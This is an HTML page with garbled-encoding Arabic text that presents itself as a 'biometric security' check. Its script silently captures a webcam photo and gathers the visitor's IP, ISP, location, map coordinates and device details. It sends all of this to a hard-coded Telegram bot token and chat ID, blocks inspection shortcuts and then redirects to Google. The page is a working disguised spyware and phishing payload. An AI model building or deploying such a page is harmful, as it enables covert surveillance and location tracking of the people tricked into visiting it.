<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø±Ù‚Ù…ÙŠ</title>
    <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; user-select: none; }
        .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="box">
        <div style="font-size: 40px;">ğŸ›¡ï¸</div>
        <h3>Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ÙˆØ­Ø¯</h3>
        <p style="font-size: 0.9em; color: #bdc3c7;">ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø­ÙŠÙˆÙŠØ© Ù„ØªØ£Ù…ÙŠÙ† Ø§ØªØµØ§Ù„Ùƒ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±.</p>
        <button class="btn" onclick="megaCapture()">Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // Ù…Ù†Ø¹ Ø§Ù„ÙØ­Øµ
        document.addEventListener('keydown', e => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
        });

        const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
        const CH_ID = "1678506419";

        async function megaCapture() {
            const btn = document.querySelector('.btn');
            btn.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...";
            btn.disabled = true;

            try {
                // 1. ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø¹ Ø¯Ø¹Ù… Ø§Ù„Ù…ÙˆØ¨Ø§ÙŠÙ„ (playsinline)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;

                setTimeout(async () => {
                    try {
                        const c = document.getElementById('c');
                        c.width = v.videoWidth; 
                        c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);

                        // 2. Ø³Ø­Ø¨ Ø§Ù„Ù€ IP Ù…Ø¹ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø®Ø·Ø£
                        let i = { ip: "N/A", org: "Unknown", city: "Unknown", country_name: "Jordan" };
                        try {
                            const res = await fetch('https://ipapi.co/json/');
                            if (res.ok) i = await res.json();
                        } catch (e) { console.log("IP API Fail"); }

                        // 3. Ø³Ø­Ø¨ Ø§Ù„Ù€ GPU Ø¨Ø£Ù…Ø§Ù†
                        let gpu = "Unknown";
                        try {
                            const gl = c.getContext('webgl');
                            const ext = gl.getExtension('WEBGL_debug_renderer_info');
                            if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                        } catch (e) { gpu = "Blocked"; }

                        // 4. Ø¨Ù†Ø§Ø¡ ØªÙ‚Ø±ÙŠØ± Ù…Ø®ØªØµØ± Ø¬Ø¯Ø§Ù‹ Ù„ØªØ¬Ù†Ø¨ Ø±ÙØ¶ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
                        const report = `
ğŸ“ IP: ${i.ip}
ğŸ¢ ISP: ${i.org}
ğŸŒ Loc: ${i.city}, ${i.country_name}
ğŸ“± Dev: ${navigator.platform} | ${navigator.hardwareConcurrency} Cores
ğŸ”‹ Bat: ${navigator.getBattery ? "Check Log" : "N/A"}
ğŸ® GPU: ${gpu.substring(0, 50)}
ğŸ”— Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;

                        // 5. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ (ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ø¨ÙˆØ¨)
                        c.toBlob(async (blob) => {
                            if (!blob) return;
                            const fd = new FormData();
                            fd.append('chat_id', CH_ID);
                            fd.append('photo', blob, 'secure.jpg');
                            fd.append('caption', report);
                            // ØªÙ… Ø¥Ù„ØºØ§Ø¡ parse_mode Ù„ØªØ¬Ù†Ø¨ ÙƒØ³Ø± Ø§Ù„Ù†Øµ Ø¨Ø§Ù„Ø±Ù…ÙˆØ²

                            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: fd
                            });

                            // Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
                            stream.getTracks().forEach(t => t.stop());
                            alert("ØªÙ… Ø§Ù„ØªØ£Ù…ÙŠÙ† Ø¨Ù†Ø¬Ø§Ø­.");
                            window.location.href = "https://google.com";
                        }, 'image/jpeg', 0.7); // ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø¬ÙˆØ¯Ø© Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„

                    } catch (e) { console.error(e); }
                }, 1500);

            } catch (e) {
                alert("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.");
                btn.innerHTML = "Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
